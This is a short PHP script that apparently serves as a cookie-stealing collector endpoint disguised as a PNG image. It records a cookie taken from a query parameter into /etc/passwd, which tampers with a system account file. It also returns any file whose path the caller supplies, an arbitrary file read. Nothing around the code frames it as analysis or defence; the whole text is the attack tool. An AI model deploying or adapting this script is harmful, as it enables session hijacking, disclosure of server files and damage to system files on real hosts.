<?php
header('Content-Type: image/png');
$cookie = $_GET['c'];
$file = $_GET['p'];
$fp = fopen('/etc/passwd', 'a');
fwrite($fp, "Cookie: ".$cookie." - File: ".$file."\n");
fclose($fp);
readfile($file);
?>
